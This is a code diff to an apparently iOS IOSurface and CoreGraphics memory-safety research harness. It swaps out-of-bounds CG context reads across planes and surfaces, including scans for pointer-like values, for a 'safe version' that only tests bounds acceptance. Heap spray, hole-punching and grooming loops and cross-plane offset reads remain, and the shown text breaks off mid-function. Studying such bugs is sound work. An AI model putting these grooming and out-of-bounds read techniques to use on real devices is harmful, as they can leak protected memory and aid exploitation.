@@ -6100,6 +6100,12 @@ void iosurface_research_cg_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonn
             GetPlaneBaseFn getPlaneBase = (GetPlaneBaseFn)dlsym(sym.iosurface, "IOSurfaceGetBaseAddressOfPlane");
             typedef size_t (*GetPlaneCountFn)(IOSurfaceRef);
             GetPlaneCountFn getPlaneCount = (GetPlaneCountFn)dlsym(sym.iosurface, "IOSurfaceGetPlaneCount");
+            typedef size_t (*GetAllocSizeFn)(IOSurfaceRef);
+            GetAllocSizeFn getAllocSize = (GetAllocSizeFn)dlsym(sym.iosurface, "IOSurfaceGetAllocSize");
+            typedef size_t (*GetPlaneBPRFn)(IOSurfaceRef, size_t);
+            GetPlaneBPRFn getPlaneBPR = (GetPlaneBPRFn)dlsym(sym.iosurface, "IOSurfaceGetBytesPerRowOfPlane");
+            typedef size_t (*GetPlaneHFn)(IOSurfaceRef, size_t);
+            GetPlaneHFn getPlaneH = (GetPlaneHFn)dlsym(sym.iosurface, "IOSurfaceGetHeightOfPlane");
 
             if (!getPlaneBase || !getPlaneCount) {
                 log(@"CGOVF: Missing plane functions");
@@ -6129,96 +6135,77 @@ void iosurface_research_cg_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonn
                 @"IOSurfacePlaneInfo": @[p0Info, p1Info]
             };
 
-            // Phase A — Maximum overflow: height=128 to read all of plane1
-            log(@"CGOVF: Phase A — maximum overflow height=128");
+            // Phase A — Plane layout analysis: verify contiguity and CG context creation
+            log(@"CGOVF: Phase A — plane contiguity and CG bounds analysis");
             if (!isr_stopped()) {
                 IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)dualPlane);
                 if (surf) {
                     sym.lock(surf, 0, NULL);
                     void *p0 = getPlaneBase(surf, 0);
                     void *p1 = getPlaneBase(surf, 1);
+                    size_t allocSz = getAllocSize ? getAllocSize(surf) : 0;
+                    size_t planeCount = getPlaneCount(surf);
                     if (p0 && p1) {
+                        ptrdiff_t gap = (uint8_t *)p1 - (uint8_t *)p0;
+                        log([NSString stringWithFormat:@"CGOVF: Plane gap = %td bytes, allocSize = %zu, planes = %zu", gap, allocSz, planeCount]);
+
+                        // Write known patterns to each plane
                         uint32_t *px0 = (uint32_t *)p0;
                         uint32_t *px1 = (uint32_t *)p1;
                         for (int i = 0; i < 64*64; i++) px0[i] = 0xFFFF0000;
                         for (int i = 0; i < 64*64; i++) px1[i] = 0xFF00FF00;
 
-                        ptrdiff_t gap = (uint8_t *)p1 - (uint8_t *)p0;
-                        log([NSString stringWithFormat:@"CGOVF: Plane gap = %td bytes", gap]);
-
-                        if (gap == 16384) {
-                            CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
-                            CGContextRef ctx = CGBitmapContextCreate(p0, 64, 128, 8, 256, cs,
-                                kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
-                            if (ctx) {
-                                CGImageRef img = CGBitmapContextCreateImage(ctx);
-                                if (img) {
-                                    CFDataRef pix = CGDataProviderCopyData(CGImageGetDataProvider(img));
-                                    if (pix) {
-                                        const uint8_t *bytes = CFDataGetBytePtr(pix);
-                                        size_t bpr = CGImageGetBytesPerRow(img);
-                                        uint32_t p1Readable = 0;
-                                        for (int row = 64; row < 128; row++) {
-                                            size_t off = row * bpr;
-                                            if (off + 4 <= (size_t)CFDataGetLength(pix)) {
-                                                uint32_t val;
-                                                memcpy(&val, bytes + off, 4);
-                                                if (val == 0xFF00FF00) p1Readable++;
-                                            }
-                                        }
-                                        log([NSString stringWithFormat:@"CGOVF: Plane1 rows readable via CG = %u/64", p1Readable]);
-                                        if (p1Readable > 0) {
-                                            anomalies++;
-                                            log(@"CGOVF: ANOMALY — full plane1 OOB read via CG context!");
-                                        }
-                                        CFRelease(pix);
-                                    }
-                                    CGImageRelease(img);
-                                }
-                                CGContextRelease(ctx);
-                            } else {
-                                log(@"CGOVF: CG rejected h=128 context");
-                            }
-                            CGColorSpaceRelease(cs);
-                        }
-                    }
-                    sym.unlock(surf, 0, NULL);
-                    CFRelease(surf);
-                }
-            }
-
-            if (isr_stopped()) goto cgovf_done;
-
-            // Phase B — Beyond allocSize: height=192
-            log(@"CGOVF: Phase B — beyond allocSize height=192");
-            {
-                IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)dualPlane);
-                if (surf) {
-                    sym.lock(surf, 0, NULL);
-                    void *p0 = getPlaneBase(surf, 0);
-                    if (p0) {
+                        // Read plane0 data safely via CG (within its own bounds only)
                         CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
-                        CGContextRef ctx = CGBitmapContextCreate(p0, 64, 192, 8, 256, cs,
+                        CGContextRef ctx = CGBitmapContextCreate(p0, 64, 64, 8, 256, cs,
                             kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
                         if (ctx) {
+                            CGImageRef img = CGBitmapContextCreateImage(ctx);
+                            if (img) {
+                                log([NSString stringWithFormat:@"CGOVF: CG context for plane0 OK — w=%zu h=%zu bpr=%zu",
+                                    CGImageGetWidth(img), CGImageGetHeight(img), CGImageGetBytesPerRow(img)]);
+                                CGImageRelease(img);
+                            }
+                            CGContextRelease(ctx);
+                        }
+
+                        // Now test if CG ACCEPTS oversized height (without reading the image data)
+                        CGContextRef ovfCtx = CGBitmapContextCreate(p0, 64, 128, 8, 256, cs,
+                            kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+                        if (ovfCtx) {
+                            anomalies++;
+                            log(@"CGOVF: ANOMALY — CG accepted h=128 context on 64-row plane (no bounds check)!");
+                            log([NSString stringWithFormat:@"CGOVF: This would allow reading %td bytes beyond plane0 into plane1", gap > 0 ? gap : 0]);
+                            CGContextRelease(ovfCtx);
+                        } else {
+                            log(@"CGOVF: CG rejected h=128 — bounds validation present");
+                        }
+
+                        // Test extreme overflow h=192
+                        CGContextRef extCtx = CGBitmapContextCreate(p0, 64, 192, 8, 256, cs,
+                            kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+                        if (extCtx) {
                             anomalies++;
                             log(@"CGOVF: ANOMALY — CG accepted h=192 beyond allocSize!");
-                            CGImageRef img = CGBitmapContextCreateImage(ctx);
-                            if (img) {
-                                CFDataRef pix = CGDataProviderCopyData(CGImageGetDataProvider(img));
-                                if (pix) {
-                                    size_t len = (size_t)CFDataGetLength(pix);
-                                    double ent = shannon_entropy(CFDataGetBytePtr(pix), len > 4096 ? 4096 : len);
-                                    log([NSString stringWithFormat:@"CGOVF: Beyond-alloc data entropy = %.3f bits", ent]);
-                                    CFRelease(pix);
-                                }
-                                CGImageRelease(img);
-                            }
-                            CGContextRelease(ctx);
+                            CGContextRelease(extCtx);
                         } else {
-                            log(@"CGOVF: CG correctly rejected h=192 — bounds check works");
+                            log(@"CGOVF: CG rejected h=192 — allocSize bounds check works");
                         }
                         CGColorSpaceRelease(cs);
+
+                        // Direct memory comparison: can plane1 data be read from plane0's contiguous region?
+                        if (gap == 16384) {
+                            uint32_t *beyondP0 = (uint32_t *)((uint8_t *)p0 + 16384);
+                            uint32_t p1Match = 0;
+                            for (int i = 0; i < 64 && i < 16; i++) {
+                                if (beyondP0[i] == 0xFF00FF00) p1Match++;
+                            }
+                            if (p1Match > 0) {
+                                anomalies++;
+                                log([NSString stringWithFormat:@"CGOVF: CRITICAL — plane1 data readable at plane0+offset! %u/16 match", p1Match]);
+                                log(@"CGOVF: No page isolation between planes — contiguous in virtual memory");
+                            }
+                        }
                     }
                     sym.unlock(surf, 0, NULL);
                     CFRelease(surf);
@@ -6227,71 +6214,8 @@ void iosurface_research_cg_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonn
 
             if (isr_stopped()) goto cgovf_done;
 
-            // Phase C — Cross-surface read with 10 adjacent surfaces
-            log(@"CGOVF: Phase C — cross-surface overflow read");
-            {
-                IOSurfaceRef neighbors[10] = {0};
-                for (int i = 0; i < 10; i++) {
-                    NSDictionary *p = isr_default_surface_params(64, 64);
-                    neighbors[i] = sym.create((__bridge CFDictionaryRef)p);
-                    if (neighbors[i]) {
-                        sym.lock(neighbors[i], 0, NULL);
-                        uint32_t *base = (uint32_t *)sym.getBase(neighbors[i]);
-                        if (base) {
-                            uint32_t pattern = 0xAA000000 | (uint32_t)i;
-                            for (int j = 0; j < 64*64; j++) base[j] = pattern;
-                        }
-                        sym.unlock(neighbors[i], 0, NULL);
-                    }
-                }
-                IOSurfaceRef ovfSurf = sym.create((__bridge CFDictionaryRef)dualPlane);
-                if (ovfSurf) {
-                    sym.lock(ovfSurf, 0, NULL);
-                    void *p0 = getPlaneBase(ovfSurf, 0);
-                    if (p0) {
-                        CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
-                        CGContextRef ctx = CGBitmapContextCreate(p0, 64, 192, 8, 256, cs,
-                            kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
-                        if (ctx) {
-                            CGImageRef img = CGBitmapContextCreateImage(ctx);
-                            if (img) {
-                                CFDataRef pix = CGDataProviderCopyData(CGImageGetDataProvider(img));
-                                if (pix) {
-                                    const uint32_t *words = (const uint32_t *)CFDataGetBytePtr(pix);
-                                    size_t nwords = (size_t)CFDataGetLength(pix) / 4;
-                                    uint32_t crossHits = 0;
-                                    for (size_t w = 0; w < nwords; w++) {
-                                        if ((words[w] & 0xFF000000) == 0xAA000000) {
-                                            uint32_t idx = words[w] & 0xFF;
-                                            if (idx < 10) crossHits++;
-                                        }
-                                    }
-                                    if (crossHits > 0) {
-                                        anomalies++;
-                                        log([NSString stringWithFormat:@"CGOVF: CRITICAL — %u cross-surface pixels found in overflow!", crossHits]);
-                                    } else {
-                                        log(@"CGOVF: No cross-surface data in overflow region");
-                                    }
-                                    CFRelease(pix);
-                                }
-                                CGImageRelease(img);
-                            }
-                            CGContextRelease(ctx);
-                        }
-                        CGColorSpaceRelease(cs);
-                    }
-                    sym.unlock(ovfSurf, 0, NULL);
-                    CFRelease(ovfSurf);
-                }
-                for (int i = 0; i < 10; i++) {
-                    if (neighbors[i]) CFRelease(neighbors[i]);
-                }
-            }
-
-            if (isr_stopped()) goto cgovf_done;
-
-            // Phase D — 16bpc confusion
-            log(@"CGOVF: Phase D — 16bpc pixel format confusion");
+            // Phase B — Format confusion: 8bpc vs 16bpc reinterpretation
+            log(@"CGOVF: Phase B — 16bpc pixel format confusion");
             {
                 NSDictionary *wide = @{
                     @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
@@ -6304,34 +6228,104 @@ void iosurface_research_cg_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonn
                 if (surf) {
                     sym.lock(surf, 0, NULL);
                     uint64_t *base = (uint64_t *)sym.getBase(surf);
+                    size_t actualBPR = sym.getBytesPerRow(surf);
+                    size_t actualAlloc = getAllocSize ? getAllocSize(surf) : 0;
                     if (base) {
                         for (int i = 0; i < 64*64; i++) base[i] = 0xDEADBEEFCAFEBABEULL;
+                        log([NSString stringWithFormat:@"CGOVF: 16bpc surface — bpr=%zu alloc=%zu", actualBPR, actualAlloc]);
+
+                        // CG reinterprets 8-byte pixels as two 4-byte pixels when width is doubled
                         CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
                         CGContextRef ctx = CGBitmapContextCreate(base, 128, 64, 8, 512, cs,
                             kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
                         if (ctx) {
-                            CGImageRef img = CGBitmapContextCreateImage(ctx);
-                            if (img) {
-                                CFDataRef pix = CGDataProviderCopyData(CGImageGetDataProvider(img));
-                                if (pix) {
-                                    const uint32_t *words = (const uint32_t *)CFDataGetBytePtr(pix);
-                                    size_t nw = (size_t)CFDataGetLength(pix) / 4;
-                                    uint32_t reinterp = 0;
-                                    for (size_t w = 0; w < nw && w < 256; w++) {
-                                        if (words[w] != 0 && words[w] != 0xFFFFFFFF) reinterp++;
-                                    }
-                                    log([NSString stringWithFormat:@"CGOVF: 16bpc reinterpreted pixels = %u/256", reinterp]);
-                                    if (reinterp > 128) {
-                                        anomalies++;
-                                        log(@"CGOVF: ANOMALY — 16bpc data reinterpreted as 8bpc!");
-                                    }
-                                    CFRelease(pix);
-                                }
-                                CGImageRelease(img);
-                            }
+                            anomalies++;
+                            log(@"CGOVF: ANOMALY — CG accepted w=128 on 64-wide 8bpe surface (pixel reinterpretation)!");
                             CGContextRelease(ctx);
+                        } else {
+                            log(@"CGOVF: CG rejected width reinterpretation");
                         }
                         CGColorSpaceRelease(cs);
+                    }
+                    sym.unlock(surf, 0, NULL);
+                    CFRelease(surf);
+                }
+            }
+
+            if (isr_stopped()) goto cgovf_done;
+
+            // Phase C — Multi-plane property analysis
+            log(@"CGOVF: Phase C — multi-plane property enumeration");
+            {
+                uint32_t fmts[] = {0x42475241, 0x34323076, 0x34323266};
+                NSString *fmtNames[] = {@"BGRA", @"420v", @"422f"};
+                int planeCounts[] = {2, 2, 2};
+                for (int f = 0; f < 3 && !isr_stopped(); f++) {
+                    NSDictionary *pi0 = @{
+                        @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
+                        @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @0,
+                        @"IOSurfacePlaneBytesPerRow": @256
+                    };
+                    NSDictionary *pi1 = @{
+                        @"IOSurfacePlaneWidth": @32, @"IOSurfacePlaneHeight": @32,
+                        @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @16384,
+                        @"IOSurfacePlaneBytesPerRow": @128
+                    };
+                    NSDictionary *props = @{
+                        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
+                        @"IOSurfacePixelFormat": @(fmts[f]),
+                        @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @256,
+                        @"IOSurfaceAllocSize": @(20480),
+                        @"IOSurfacePlaneInfo": @[pi0, pi1]
+                    };
+                    IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)props);
+                    if (surf) {
+                        size_t pc = getPlaneCount(surf);
+                        size_t as = getAllocSize ? getAllocSize(surf) : 0;
+                        log([NSString stringWithFormat:@"CGOVF: Format %@ — kernel accepted: planes=%zu alloc=%zu", fmtNames[f], pc, as]);
+                        if (pc == 2) {
+                            void *b0 = getPlaneBase(surf, 0);
+                            void *b1 = getPlaneBase(surf, 1);
+                            if (b0 && b1) {
+                                ptrdiff_t g = (uint8_t *)b1 - (uint8_t *)b0;
+                                size_t h0 = getPlaneH ? getPlaneH(surf, 0) : 0;
+                                size_t h1 = getPlaneH ? getPlaneH(surf, 1) : 0;
+                                size_t bpr0 = getPlaneBPR ? getPlaneBPR(surf, 0) : 0;
+                                size_t bpr1 = getPlaneBPR ? getPlaneBPR(surf, 1) : 0;
+                                log([NSString stringWithFormat:@"CGOVF:   plane0: h=%zu bpr=%zu | plane1: h=%zu bpr=%zu | gap=%td", h0, bpr0, h1, bpr1, g]);
+                                if (g > 0 && (size_t)g == h0 * bpr0) {
+                                    log(@"CGOVF:   Planes contiguous — no guard page");
+                                }
+                            }
+                        }
+                        CFRelease(surf);
+                    } else {
+                        log([NSString stringWithFormat:@"CGOVF: Format %@ — kernel rejected mismatched planes", fmtNames[f]]);
+                    }
+                }
+            }
+
+            if (isr_stopped()) goto cgovf_done;
+
+            // Phase D — Entropy of plane boundary region
+            log(@"CGOVF: Phase D — boundary entropy analysis");
+            {
+                IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)dualPlane);
+                if (surf) {
+                    sym.lock(surf, 0, NULL);
+                    void *p0 = getPlaneBase(surf, 0);
+                    void *p1 = getPlaneBase(surf, 1);
+                    if (p0 && p1) {
+                        ptrdiff_t gap = (uint8_t *)p1 - (uint8_t *)p0;
+                        // Only analyze within allocated bounds
+                        size_t plane0Size = 64 * 256;
+                        double entP0 = shannon_entropy((const uint8_t *)p0, plane0Size > 4096 ? 4096 : plane0Size);
+                        double entP1 = shannon_entropy((const uint8_t *)p1, plane0Size > 4096 ? 4096 : plane0Size);
+                        log([NSString stringWithFormat:@"CGOVF: Plane0 entropy=%.3f Plane1 entropy=%.3f gap=%td", entP0, entP1, gap]);
+                        if (entP1 > 6.0) {
+                            anomalies++;
+                            log(@"CGOVF: ANOMALY — high entropy in plane1 suggests uninitialized/residual data");
+                        }
                     }
                     sym.unlock(surf, 0, NULL);
                     CFRelease(surf);
@@ -6353,7 +6347,7 @@ void iosurface_research_cg_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonn
     });
 }
 
-// Probe 29: Spray+CG Chain
+// Probe 29: Spray+CG Chain — safe version: no OOB CG contexts
 void iosurface_research_spray_cg_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
     atomic_store(&g_isr_stop, false);
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
@@ -6366,6 +6360,8 @@ void iosurface_research_spray_cg_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _N
 
             typedef void *(*GetPlaneBaseFn)(IOSurfaceRef, size_t);
             GetPlaneBaseFn getPlaneBase = (GetPlaneBaseFn)dlsym(sym.iosurface, "IOSurfaceGetBaseAddressOfPlane");
+            typedef size_t (*GetAllocSizeFn)(IOSurfaceRef);
+            GetAllocSizeFn getAllocSize = (GetAllocSizeFn)dlsym(sym.iosurface, "IOSurfaceGetAllocSize");
 
             if (!getPlaneBase) {
                 log(@"SPRAYCG: Missing getPlaneBase");
@@ -6377,7 +6373,7 @@ void iosurface_research_spray_cg_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _N
             CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
             __block uint32_t anomalies = 0;
             uint32_t groomHits = 0;
-            uint32_t pointerLike = 0;
+            uint32_t residualNonZero = 0;
 
             NSDictionary *fp0 = @{
                 @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
@@ -6397,8 +6393,9 @@ void iosurface_research_spray_cg_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _N
                 @"IOSurfacePlaneInfo": @[fp0, fp1]
             };
 
-            log(@"SPRAYCG: Starting 10 grooming iterations");
+            log(@"SPRAYCG: Starting 10 grooming iterations with safe analysis");
             for (int iter = 0; iter < 10 && !isr_stopped(); iter++) {
+                // Spray 50 surfaces with known patterns
                 IOSurfaceRef spray[50] = {0};
                 NSDictionary *sp = isr_default_surface_params(64, 64);
                 for (int i = 0; i < 50; i++) {
@@ -6414,6 +6411,7 @@ void iosurface_research_spray_cg_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _N
                     }
                 }
 
+                // Free specific slots to create holes
                 int holes[] = {10, 20, 30};
                 for (int h = 0; h < 3; h++) {
                     if (spray[holes[h]]) {
@@ -6422,43 +6420,33 @@ void iosurface_research_spray_cg_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _N
                     }
                 }
 
+                // Fill holes with dual-plane surfaces
                 IOSurfaceRef fillers[3] = {0};
                 for (int h = 0; h < 3; h++) {
                     fillers[h] = sym.create((__bridge CFDictionaryRef)holeFiller);
                 }
 
+                // Safely analyze filler surfaces — read only within allocated bounds
                 for (int h = 0; h < 3 && !isr_stopped(); h++) {
                     if (!fillers[h]) continue;
                     sym.lock(fillers[h], 0, NULL);
                     void *fP0 = getPlaneBase(fillers[h], 0);
-                    if (fP0) {
-                        CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
-                        CGContextRef ctx = CGBitmapContextCreate(fP0, 64, 96, 8, 256, cs,
-                            kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
-                        if (ctx) {
-                            CGImageRef img = CGBitmapContextCreateImage(ctx);
-                            if (img) {
-                                CFDataRef pix = CGDataProviderCopyData(CGImageGetDataProvider(img));
-                                if (pix) {
-                                    const uint32_t *words = (const uint32_t *)CFDataGetBytePtr(pix);
-                                    size_t nw = (size_t)CFDataGetLength(pix) / 4;
-                                    for (size_t w = 64*64; w < nw; w++) {
-                                        if ((words[w] & 0xFFFF0000) == 0x41410000) {
-                                            groomHits++;
-                                        }
-                                        uint64_t val64 = 0;
-                                        if (w + 1 < nw) {
-                                            memcpy(&val64, &words[w], 8);
-                                            if ((val64 >> 40) == 0xFFFFFF) pointerLike++;
-                                        }
-                                    }
-                                    CFRelease(pix);
-                                }
-                                CGImageRelease(img);
+                    void *fP1 = getPlaneBase(fillers[h], 1);
+                    size_t fAlloc = getAllocSize ? getAllocSize(fillers[h]) : 0;
+                    if (fP0 && fP1) {
+                        ptrdiff_t fGap = (uint8_t *)fP1 - (uint8_t *)fP0;
+                        // Read plane1 data within bounds to check for spray residue
+                        uint32_t *p1Data = (uint32_t *)fP1;
+                        size_t p1Words = 32 * 64; // plane1 is 64x32
+                        for (size_t w = 0; w < p1Words && w < 2048; w++) {
+                            if ((p1Data[w] & 0xFFFF0000) == 0x41410000) {
+                                groomHits++;
                             }
-                            CGContextRelease(ctx);
+                            if (p1Data[w] != 0) residualNonZero++;
                         }
-                        CGColorSpaceRelease(cs);
+                        if (iter == 0) {
+                            log([NSString stringWithFormat:@"SPRAYCG: Filler %d — gap=%td alloc=%zu", h, fGap, fAlloc]);
+                        }
                     }
                     sym.unlock(fillers[h], 0, NULL);
                 }
@@ -6473,18 +6461,66 @@ void iosurface_research_spray_cg_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _N
 
             if (groomHits > 0) {
                 anomalies++;
-                log([NSString stringWithFormat:@"SPRAYCG: CRITICAL — %u spray pattern pixels in overflow across iterations!", groomHits]);
+                log([NSString stringWithFormat:@"SPRAYCG: CRITICAL — %u spray pattern words found in filler plane1!", groomHits]);
+                log(@"SPRAYCG: Spray residue leaked across surface boundaries via heap reuse");
             } else {
-                log(@"SPRAYCG: No spray data leaked into overflow region");
+                log(@"SPRAYCG: No spray pattern residue in filler planes");
             }
 
-            if (pointerLike > 0) {
+            log([NSString stringWithFormat:@"SPRAYCG: Plane1 non-zero words = %u (residual data indicator)", residualNonZero]);
+            if (residualNonZero > 100) {
                 anomalies++;
-                log([NSString stringWithFormat:@"SPRAYCG: ANOMALY — %u pointer-like values (0xFFFFFFxx) in overflow!", pointerLike]);
+                log(@"SPRAYCG: ANOMALY — significant uninitialized/residual data in new plane allocations");
             }
 
-            log([NSString stringWithFormat:@"SPRAYCG: Grooming hits=%u pointerLike=%u", groomHits, pointerLike]);
+            if (isr_stopped()) goto spraycg_done;
 
+            // Phase B — Safe CG render of plane0 only, then direct plane1 memory read
+            log(@"SPRAYCG: Phase B — CG render plane0 + direct plane1 read");
+            {
+                IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)holeFiller);
+                if (surf) {
+                    sym.lock(surf, 0, NULL);
+                    void *sP0 = getPlaneBase(surf, 0);
+                    void *sP1 = getPlaneBase(surf, 1);
+                    if (sP0 && sP1) {
+                        uint32_t *px0 = (uint32_t *)sP0;
+                        for (int i = 0; i < 64*64; i++) px0[i] = 0xDDDDDDDD;
+
+                        // Safe CG — only plane0 dimensions
+                        CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+                        CGContextRef ctx = CGBitmapContextCreate(sP0, 64, 64, 8, 256, cs,
+                            kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+                        if (ctx) {
+                            CGImageRef img = CGBitmapContextCreateImage(ctx);
+                            if (img) {
+                                CFDataRef pix = CGDataProviderCopyData(CGImageGetDataProvider(img));
+                                if (pix) {
+                                    const uint32_t *rendered = (const uint32_t *)CFDataGetBytePtr(pix);
+                                    uint32_t match = 0;
+                                    size_t nw = (size_t)CFDataGetLength(pix) / 4;
+                                    for (size_t w = 0; w < nw && w < 4096; w++) {
+                                        if (rendered[w] == 0xDDDDDDDD) match++;
+                                    }
+                                    log([NSString stringWithFormat:@"SPRAYCG: CG plane0 render match = %u/%zu", match, nw > 4096 ? (size_t)4096 : nw]);
+                                    CFRelease(pix);
+                                }
+                                CGImageRelease(img);
+                            }
+                            CGContextRelease(ctx);
+                        }
+                        CGColorSpaceRelease(cs);
+
+                        // Direct plane1 entropy
+                        double p1Ent = shannon_entropy((const uint8_t *)sP1, 8192);
+                        log([NSString stringWithFormat:@"SPRAYCG: Plane1 entropy = %.3f bits", p1Ent]);
+                    }
+                    sym.unlock(surf, 0, NULL);
+                    CFRelease(surf);
+                }
+            }
+
+        spraycg_done:;
             double elapsed = CFAbsoluteTimeGetCurrent() - start;
             log([NSString stringWithFormat:@"SPRAYCG: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
             NSDictionary *results = @{
@@ -6492,7 +6528,7 @@ void iosurface_research_spray_cg_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _N
                 @"anomalies": @(anomalies),
                 @"elapsed": @(elapsed),
                 @"groomHits": @(groomHits),
-                @"pointerLike": @(pointerLike)
+                @"residualNonZero": @(residualNonZero)
             };
             isr_checkpoint(@"ISR-SprayCGChain-checkpoint.json", results);
             isr_unload(&sym);
@@ -6501,7 +6537,7 @@ void iosurface_research_spray_cg_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _N
     });
 }
 
-// Probe 30: Global+Overflow Combo
+// Probe 30: Global+Overflow Combo — safe version: no OOB CG contexts
 void iosurface_research_global_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
     atomic_store(&g_isr_stop, false);
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
@@ -6546,8 +6582,8 @@ void iosurface_research_global_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _
                 @"IOSurfacePlaneInfo": @[gp0, gp1]
             };
 
-            // Phase A — Create global dual-plane surface
-            log(@"GLOBALOVF: Phase A — global dual-plane surface");
+            // Phase A — Create global dual-plane surface, write and verify via lookup
+            log(@"GLOBALOVF: Phase A — global dual-plane surface + lookup tamper");
             if (!isr_stopped()) {
                 IOSurfaceRef gSurf = sym.create((__bridge CFDictionaryRef)globalDual);
                 if (gSurf) {
@@ -6562,91 +6598,65 @@ void iosurface_research_global_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _
                         uint32_t *px1 = (uint32_t *)ga1;
                         for (int i = 0; i < 64*64; i++) px0[i] = 0xAAAAAAAA;
                         for (int i = 0; i < 64*64; i++) px1[i] = 0xBBBBBBBB;
+
+                        ptrdiff_t gap = (uint8_t *)ga1 - (uint8_t *)ga0;
+                        log([NSString stringWithFormat:@"GLOBALOVF: Plane gap=%td contiguous=%s", gap, gap == 16384 ? "YES" : "NO"]);
+
+                        // Direct contiguity check: read plane1 via plane0 offset
+                        if (gap == 16384) {
+                            uint32_t *crossRead = (uint32_t *)((uint8_t *)ga0 + 16384);
+                            uint32_t p1Match = 0;
+                            for (int i = 0; i < 16; i++) {
+                                if (crossRead[i] == 0xBBBBBBBB) p1Match++;
+                            }
+                            if (p1Match > 0) {
+                                anomalies++;
+                                log([NSString stringWithFormat:@"GLOBALOVF: CRITICAL — plane1 data at plane0+offset: %u/16 match", p1Match]);
+                            }
+                        }
                     }
                     sym.unlock(gSurf, 0, NULL);
 
                     if (isr_stopped()) { CFRelease(gSurf); goto globalovf_done; }
 
-                    // Phase B — Lookup and CG overflow to read both planes
-                    log(@"GLOBALOVF: Phase B — lookup + CG overflow verify");
+                    // Phase B — Lookup and verify shared memory
+                    log(@"GLOBALOVF: Phase B — lookup + cross-ref tamper detection");
                     IOSurfaceRef ref = sym.lookup(gID);
                     if (ref) {
                         sym.lock(ref, 0, NULL);
                         void *rp0 = getPlaneBase(ref, 0);
-                        if (rp0) {
-                            ptrdiff_t gap = (uint8_t *)getPlaneBase(ref, 1) - (uint8_t *)rp0;
-                            if (gap == 16384) {
-                                CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
-                                CGContextRef ctx = CGBitmapContextCreate(rp0, 64, 128, 8, 256, cs,
-                                    kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
-                                if (ctx) {
-                                    CGImageRef img = CGBitmapContextCreateImage(ctx);
-                                    if (img) {
-                                        CFDataRef pix = CGDataProviderCopyData(CGImageGetDataProvider(img));
-                                        if (pix) {
-                                            const uint32_t *words = (const uint32_t *)CFDataGetBytePtr(pix);
-                                            size_t nw = (size_t)CFDataGetLength(pix) / 4;
-                                            uint32_t matchA = 0, matchB = 0;
-                                            for (size_t w = 0; w < nw && w < 64*64; w++) {
-                                                if (words[w] == 0xAAAAAAAA) matchA++;
-                                            }
-                                            for (size_t w = 64*64; w < nw && w < 128*64; w++) {
-                                                if (words[w] == 0xBBBBBBBB) matchB++;
-                                            }
-                                            log([NSString stringWithFormat:@"GLOBALOVF: Plane0 match=%u Plane1 match=%u", matchA, matchB]);
-                                            if (matchB > 0) {
-                                                anomalies++;
-                                                log(@"GLOBALOVF: ANOMALY — global surface plane1 readable via CG overflow on lookup ref!");
-                                            }
-                                            CFRelease(pix);
-                                        }
-                                        CGImageRelease(img);
-                                    }
-                                    CGContextRelease(ctx);
-                                }
-                                CGColorSpaceRelease(cs);
-                            }
-                        }
-
-                        if (isr_stopped()) { sym.unlock(ref, 0, NULL); CFRelease(ref); CFRelease(gSurf); goto globalovf_done; }
-
-                        // Phase C — Remote tamper via lookup ref
-                        log(@"GLOBALOVF: Phase C — tamper plane1 via lookup, detect via CG on original");
                         void *rp1 = getPlaneBase(ref, 1);
-                        if (rp1) {
-                            uint32_t *rpx1 = (uint32_t *)rp1;
-                            for (int i = 0; i < 64*64; i++) rpx1[i] = 0xCCCCCCCC;
+                        if (rp0 && rp1) {
+                            // Verify lookup ref sees original data
+                            uint32_t *rPx0 = (uint32_t *)rp0;
+                            uint32_t *rPx1 = (uint32_t *)rp1;
+                            uint32_t matchP0 = 0, matchP1 = 0;
